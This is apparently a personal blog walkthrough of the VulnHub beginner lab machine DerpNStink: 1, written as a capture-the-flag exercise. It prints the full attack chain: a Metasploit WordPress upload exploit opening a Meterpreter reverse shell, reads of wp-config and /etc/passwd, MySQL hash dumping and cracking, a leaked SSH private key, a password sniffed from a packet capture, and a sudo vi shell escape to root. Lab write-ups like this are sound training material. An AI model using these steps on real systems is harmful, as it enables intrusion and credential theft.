+++
author = "Chris Suttles"
categories = ["pentesting", "CTF", "vulnhub", "offsec", "security", "BootToRoot"]
date = 2019-05-08T08:05:54Z
description = ""
draft = false
cover = "/images/2019/05/Screen-Shot-2019-05-06-at-10.53.48-PM.png"
slug = "derpnstink-1"
tags = ["pentesting", "CTF", "vulnhub", "offsec", "security", "BootToRoot"]
title = "DerpNStink: 1"

+++


After all the fun I've had doing vulnhub boxes with my friends, I wanted to try to solve one by myself to switch things up a bit. I downloaded [DerpNStink: 1](https://www.vulnhub.com/entry/derpnstink-1,221/) from vulnhub, and got to work.

## Author Blurb

> ### Difficulty:
> Beginner
> 
> ### Description:
> Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...
> 
> ### Instructions:
> This is a boot2root Ubuntu based virtual machine. It was tested on VMware Fusion and VMware Workstation12 using DHCP settings for its network interface. It was designed to model some of the earlier machines I encountered during my OSCP labs also with a few minor curve-balls but nothing too fancy. Stick to your classic hacking methodology and enumerate all the things!
> 
> Your goal is to remotely attack the VM and find all 4 flags eventually leading you to full root access. Don't forget to #tryharder
> 
> Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier.
> 
> ### Contact
> Hit me up if you enjoy this VM! Twitter: @securekomodo Email: hackerbryan@protonmail.com

## Enumeration

This is a beginner level vulnerable machine, so an nmap scan was pretty sparse. No surprises here. I ended up using all three of the available services to capture the available flags on this machine.

{{< highlight markdown >}}

msf5 > db_nmap -sV -O -A -p- -T5 target
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 00:05 EDT
[*] Nmap: Nmap scan report for target (192.168.167.145)
[*] Nmap: Host is up (0.00081s latency).
[*] Nmap: rDNS record for 192.168.167.145: derpstink
[*] Nmap: Not shown: 65532 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 3.0.2
[*] Nmap: 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
[*] Nmap: |   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
[*] Nmap: |   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
[*] Nmap: |_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
[*] Nmap: | http-robots.txt: 2 disallowed entries
[*] Nmap: |_/php/ /temporary/
[*] Nmap: |_http-server-header: Apache/2.4.7 (Ubuntu)
[*] Nmap: |_http-title: DeRPnStiNK
[*] Nmap: MAC Address: 00:0C:29:AE:8D:F3 (VMware)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X|4.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
[*] Nmap: OS details: Linux 3.2 - 4.9
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.81 ms derpstink (192.168.167.145)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds

{{< / highlight >}}

## HTTP

Since anonymous ftp didn't turn up anything, and we need to have creds for SSH, HTTP was the obvious starting point. I checked out `robots.txt`, and poked with curl. That turned up the first flag almost immediately.

{{< highlight markdown >}}

curl target
...
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->

{{< / highlight >}}

While that was encouraging, I figured it was also maybe a little misleading, and that the rest would be more difficult. That turned out to be correct.

### Dirb

After a little manual exploring, I ran `dirb` to see what was there. This turned up a wordpress blog, and also a phpmyadmin installation, along with some red herrings.

### WPScan

WPScan turned up a lot of vulnerabilities, but many required authentication. I ended up exploring a lot of the other `dirb` output before I circled back to try `admin/admin` to get into wordpress. When it worked, I came very close to a literal facepalm. I had spent a lot of time looking at more difficult attack vectors when all I had to do was log in with default credentials.

Since the output of WPScan can be pretty large, here's just the part I used to get a shell.

{{< highlight markdown >}}

[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2019-04-01T15:08:00.000Z
 | [!] The version is out of date, the latest version is 1.6.10
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
 |     Fixed in: 1.4.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7532
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
 |      - https://www.exploit-db.com/exploits/34681/
 |      - https://www.exploit-db.com/exploits/34514/
 |      - http://seclists.org/bugtraq/2014/Sep/1
 |      - http://packetstormsecurity.com/files/131526/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
 |
 
{{< / highlight >}}

Oh, look! It even has a metasploit module!

{{< highlight markdown >}}

msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin                                                                                                         
wp_user => admin                                                                                                                                                                 
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_password admin                                                                                                     
wp_password => admin                                                                                                                                                             
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > exploit                                                                                                                   
                                                                                                                                                                                 
[*] Started reverse TCP handler on 192.168.167.137:4444                                                                                                                          
[*] Trying to login as admin                                                                                                                                                     
[*] Trying to upload payload                                                                                                                                                     
[*] Uploading payload                                                                                                                                                            
[*] Calling uploaded file aazpjbrr.php                                                                                                                                           
[*] Sending stage (38247 bytes) to 192.168.167.138                                                                                                                               
[*] Meterpreter session 1 opened (192.168.167.137:4444 -> 192.168.167.138:37182) at 2019-05-05 16:25:53 -0400                                                                    
[+] Deleted aazpjbrr.php                                                                                                                                                         
                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                            
meterpreter >                                                                                                                                                                    
meterpreter > getuid                                                                                                                                                             
Server username: www-data (33)                                                                                                                                                   
meterpreter > ls                                                                                                                                                                 
Listing: /var/www/html/weblog/wp-content/uploads/slideshow-gallery                                                                                                               
================================================================== 

{{< / highlight >}}

My notes for `/weblog/` definitely include the word `yikes`. With the trivial effort to get a shell, I knew I was going to have to do something tricky to get the next step. Wrong. I made this part harder than it was because I missed an important detail when I tried to move too fast. Let me back up and explain properly before I repeat that mistake here!

### MySQL

With a shell as the `www-data` user, I could grab credentials for wordpress easily. While I was at it, I grabbed `/etc/passwd` to get a real user list.

{{< highlight markdown >}}

www-data@DeRPnStiNK:/var/www/html/weblog$ grep -i db wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mysql');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
define('SECURE_AUTH_SALT', '14EV-M=x?/lW3ODB7ro^;}&J4&ggBY#xohsa&7ZX/l[Xp,P;DY;AbPDA4oO#<vKd');
www-data@DeRPnStiNK:/var/www/html/weblog$
www-data@DeRPnStiNK:/var/www/html/weblog$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
saned:x:108:115::/home/saned:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
mysql:x:116:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
www-data@DeRPnStiNK:/var/www/html/weblog$ 

{{< / highlight >}}

Next I was able to connect to mysql and dump some passwords. Since the user/pass combo was so simple, I decided to go right for the gold and connect to mysql db directly:

{{< highlight markdown >}}

www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -uroot -pmysql mysql
mysql> select user, host, password from user;
+------------------+------------------+-------------------------------------------+
| user             | host             | password                                  |
+------------------+------------------+-------------------------------------------+
| root             | localhost        | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | derpnstink       | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | 127.0.0.1        | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| root             | ::1              | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
| debian-sys-maint | localhost        | *B95758C76129F85E0D68CF79F38B66F156804E93 |
| unclestinky      | derpnstink.local | *9B776AFB479B31E8047026F1185E952DD1E530CB |
| phpmyadmin       | localhost        | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
+------------------+------------------+-------------------------------------------+
7 rows in set (0.00 sec)

Next I popped these hashes into a file for cracking:


{{< / highlight >}}
root@kali:[~/derpnstink]: 
[Exit: 0] 00:25: cat johnmysql.txt 
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA
debian-sys-maint:*B95758C76129F85E0D68CF79F38B66F156804E93
unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB
phpmyadmin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441
...
[Exit: 0] 21:01: john --users='unclestinky' --fork=3 --format=mysql-sha1 johnmysql.txt  
...
root@kali:[~/derpnstink]: 
[Exit: 0] 21:01: john --show johnmysql.txt 
root:mysql
root:mysql
root:mysql
root:mysql
unclestinky:wedgie57
phpmyadmin:admin
{{< highlight markdown >}}


## Whoops

This is where I made my mistake. The `root/mysql` combo cracked very quickly. I started looking at other things, and missed it when john cracked the password for `unclestinky`. I thought I hit a dead end, and I wasted a **_TON of time._**

I looked at a million kernel exploits, and compiled and tried all of the ones I thought would work. I enumerated the box by hand and with two enumeration scripts. I was sure I missed something important, so I pored over those results and manually inspected the box as well. I looked at every cron job on the box, grepping for file paths in them, and checking permissions to see if I could hijack one, even though I suspected the enumeration scripts I ran probably already did that. I was stumped. I went back to the well with HTTP and chased all the red herrings. I tried to hijack mysql just to become a different user, because I thought I hit a wall with `www-data`. I let one kernel exploit run overnight, out of sheer desperation, because I figured if I could get root I could get all the flags. While that may be true, it ultimately only stalled my progress. The exploit I let run did succeed, but to my chagrin, it was a POC so although it got a root shell, _I_ never got access to that shell.

> Contradictions do not exist. Whenever you think you are facing a contradiction, check your premises. You will find that one of them is wrong.

My mistake lead me to this false contradiction: "This is a beginner level machine. Why is this so hard?"

I decided to check my premises. I looked for another walkthrough to get me unstuck. I was careful to read as little as possible so that I could learn by doing, not by reading. In that walkthrough, the author popped the mysql password for `unclestinky` into [crackstation](https://crackstation.net/). I closed the browser tab and did the same. Boom.

The astute reader will notice that the mysql password for `unclestinky` is already included in this post in the output from john the ripper. After grabbing it on [crackstation](https://crackstation.net/), I decided to revisit john. When I re-ran john, I saw what I had missed; it had already cracked the password I wanted. It was still running to crack a password that didn't matter:


{{< / highlight >}}
| debian-sys-maint | localhost        | *B95758C76129F85E0D68CF79F38B66F156804E93 |
{{< highlight markdown >}}


## Back On Track

I had corrected my misstep with the help of the almighty internet and learned some valuable lessons:

* always try the easy way first
* make sure you double check your results before moving to a more difficult task

Now I had the password for the only other wordpress user, which I was sure was the route to getting a foothold as a real user. I logged into wordpress as `unclestinky` and poked around; when I checked the posts section of the admin interface I found a draft called `flag.txt`


{{< / highlight >}}
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

{{< highlight markdown >}}


Well that's great.

## FTP

Early on I grabbed the `/etc/ssh/sshd_config` file and saw that password authentication was disabled, so I knew if I could re-use this password, it would be via ftp. I also grabbed the `vsftpd` config file, and `/etc/passwd` so I knew the only user who could log in via ftp was the system user`stinky`.


{{< / highlight >}}
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.conf | grep -vP '^$|^#'
listen=YES
anonymous_enable=yes
local_enable=YES
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
chroot_local_user=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
user_sub_token=$USER
local_root=/home/$USER/ftp
pasv_min_port=40000
pasv_max_port=50000
userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ 


www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ cat /etc/vsftpd.userlist
stinky
{{< highlight markdown >}}


Here's the loot from `stinky`'s ftp access:


{{< / highlight >}}
# from lftp I cat the file:
...
<--- 150 Opening BINARY mode data connection for network-logs/derpissues.txt ...
<--- 226 Transfer complete.
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
719 bytes transferred
lftp stinky@derpnstink.local:/files> 
...
lftp stinky@derpnstink.local:/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh> cat key.txt ...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
1675 bytes transferred                  
{{< highlight markdown >}}


## SSH

### Stinky

The next step was to connect with the ssh key I found as the user `stinky` and see what else I could grab. Oh, look, a flag!


{{< / highlight >}}
root@kali:[~/derpnstink]:                                                                                                                                                         
[Exit: 0] 00:25: ssh -i stinky.key stinky@target                                                                                                                                  
                                                                                                                                                                                  
Ubuntu 14.04.5 LTS                                                                                                                                                                
                                                                                                                                                                                  
                                                                                                                                                                                  
                       ,~~~~~~~~~~~~~..                                                                                                                                           
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/                                                            
     /~ (__________)                                 
    (*)  ; (^)(^)':                    
        =;  ____  ;           
          ; """"  ;=                
   {"}_   ' '""' ' _{"}                                           
   \__/     >  <   \__/                                        
      \    ,"   ",  /                                              
       \  "       /"                                         
          "      "=                                                
           >     <                                               
          ="     "-                     
          -`.   ,'                                   
                -                  
            `--'                   
                                 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
                                  
 * Documentation:  https://help.ubuntu.com/      
                                            
331 packages can be updated.                   
231 updates are security updates.                
                                            
Last login: Mon May  6 23:51:04 2019 from 192.168.167.7
                                                 
stinky@DeRPnStiNK:~$                           
stinky@DeRPnStiNK:~$ find .       
...
stinky@DeRPnStiNK:~$ ls
Desktop  Documents  Downloads  ftp
stinky@DeRPnStiNK:~$ ls -r Desktop/
flag.txt
stinky@DeRPnStiNK:~$ cat Desktop/flag.txt 
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
stinky@DeRPnStiNK:~$ ls -r Documents/
derpissues.pcap
stinky@DeRPnStiNK:~$ 
{{< highlight markdown >}}


More important than the flag, I found the pcap that was referred to in the chat log I found via ftp. I grabbed that and did a very lazy parse. Oh, look, a password!


{{< / highlight >}}
scp -i stinky.key stinky@target:~/Documents/derpissues.pcap .
# get password for mrderp from pcap ; pass is reused in system and wordpress:
tshark -r derpissues.pcap -2 -Y http -V  | grep -i pass
Running as user "root" and group "root". This could be dangerous.
...                         
    [Request URI [truncated]: http://derpnstink.local/weblog/wp-admin/load-scripts.php?c=0&load%5B%5D=hoverIntent,common,admin-bar,wp-ajax-response,password-strength-meter,underscore,wp-util,user-profile,svg-painter,heartbeat,wp-a&load%5B%5D=u]                                     
    Form item: "pass1" = "derpderpderpderpderpderpderp"
        Key: pass1
    Form item: "pass1-text" = "derpderpderpderpderpderpderp"
        Key: pass1-text
    Form item: "pass2" = "derpderpderpderpderpderpderp"
        Key: pass2
...
{{< highlight markdown >}}


### MrDerp

Since password auth is disallowed in `sshd_config`, I just did a `su - mrderp` from my shell as `stinky`. I used the password from the packet capture, and was authenticated.


{{< / highlight >}}
stinky@DeRPnStiNK:~$ su - mrderp
Password:
mrderp@DeRPnStiNK:~$ ls                                                              
binaries  Desktop  Documents  Downloads                                                                                                                                          
mrderp@DeRPnStiNK:~$ ls Documents/                                              
mrderp@DeRPnStiNK:~$ ls Desktop/                                                                                                                                                 
helpdesk.log                                                                                                                                                                     
mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log                   
From: Help Desk <helpdesk@derpnstink.local>
Date: Thu, Aug 23, 2017 at 1:29 PM
Subject: sudoers ISSUE=242 PROJ=26
...
{{< highlight markdown >}}


Based on the hint in the helpdesk log, I went straight to looking at `sudo`.


{{< / highlight >}}
mrderp@DeRPnStiNK:~/Desktop$ sudo -l
[sudo] password for mrderp:
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
...
mrderp@DeRPnStiNK:~$ mkdir -p binaries
mrderp@DeRPnStiNK:~$ cd binaries/
mrderp@DeRPnStiNK:~/binaries$ cp /usr/bin/vi derpy
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy
#from vim:
<esc>
:shell
# and now I 'm root
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
{{< highlight markdown >}}


### Root

There's not much left to do here. I poked around because I'm curious and wanted to better understand the build of this vulnerable machine. Like most of these, once you have `root`, getting the flag is trivial.


{{< / highlight >}}
